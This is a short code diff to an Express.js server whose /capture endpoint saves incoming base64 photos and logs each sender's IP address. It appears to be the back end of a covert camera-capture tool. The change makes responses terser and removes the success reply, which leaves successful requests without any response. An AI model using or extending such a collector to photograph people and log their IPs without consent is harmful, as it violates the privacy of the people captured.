@@ -17,7 +17,7 @@ app.use(express.json({ limit: "5mb" }));
 // Handle image capture
 app.post("/capture", (req, res) => {
     if (!req.body.image) {
-        return res.status(400).send("No image data received.");
+        return res.sendStatus(400);
     }
 
     const userIP = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
@@ -27,13 +27,12 @@ app.post("/capture", (req, res) => {
     fs.writeFile(imagePath, imageData, "base64", (err) => {
         if (err) {
             console.error("Error saving image:", err);
-            return res.status(500).send("Error saving image");
+            return res.sendStatus(500);
         }
 
         console.log(`[+] Photo received! IP: ${userIP}`);
         fs.appendFileSync("server.log", `Photo received! IP: ${userIP}\n`);
 
-        res.send("Image saved");
     });
 });
 
